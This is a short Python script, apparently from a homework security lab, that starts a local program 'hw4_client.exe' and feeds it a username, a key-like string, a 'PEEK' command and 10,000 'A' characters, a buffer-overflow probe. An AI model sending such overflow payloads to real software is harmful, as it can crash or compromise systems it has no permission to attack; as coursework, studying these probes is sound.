import subprocess

# Path to the .exe file
exe_path = "hw4_client.exe"

# Start the process
process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
0
payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("A" * 10000) +"USER\n"
# Provide user_name
output, error = process.communicate(input= payload)
print(output)

